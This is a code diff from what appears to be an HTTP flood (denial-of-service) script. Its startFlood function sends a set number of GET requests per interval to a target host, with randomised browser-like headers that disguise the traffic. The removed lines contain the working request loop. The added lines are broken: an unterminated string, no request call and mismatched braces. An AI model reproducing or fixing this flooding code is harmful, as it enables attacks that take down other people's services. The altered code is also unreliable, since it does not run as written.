@@ -61,38 +61,14 @@ function startFlood() {
   const interval = setInterval(() => {
     for (let i = 0; i < rps; i++) {
       const options = {
-        host: host,
-        port: customPort,
-        path: parsed.path,
         method: 'GET',
         headers: {
           'Host': host,
-          'DNT': '1',
-          'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
-          'Accept-Language': 'en-US,en;q=0.9',
-          'Accept-Encoding': 'gzip, deflate, br',
-          'Pragma': 'no-cache',
-          'Cache-Control': 'max-age=0',
-          'Upgrade-Insecure-Requests': '1',
+          'Accept': 'application/json',
+          'User-Agent': 'userAgents[Math.floor(Math.random() * userAgents.length)],
           'Connection': 'keep-alive'
-        },
+        }
       };
 
-      const request = http.request(options);
-      request.setHeader('Host', host);
-      request.setHeader('DNT', '1');
-      request.setHeader('User-Agent', userAgents[Math.floor(Math.random() * userAgents.length)]);
-      request.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3');
-      request.setHeader('Accept-Language', 'en-US,en;q=0.9');
-      request.setHeader('Accept-Encoding', 'gzip, deflate, br');
-      request.setHeader('Pragma', 'no-cache');
-      request.setHeader('Cache-Control', 'max-age=0');
-      request.setHeader('Upgrade-Insecure-Requests', '1');
-      request.setHeader('Connection', 'keep-alive');
-      request.end();
-    }
-  });
-
   setTimeout(() => clearInterval(interval), time * 1000);
-}
+  }
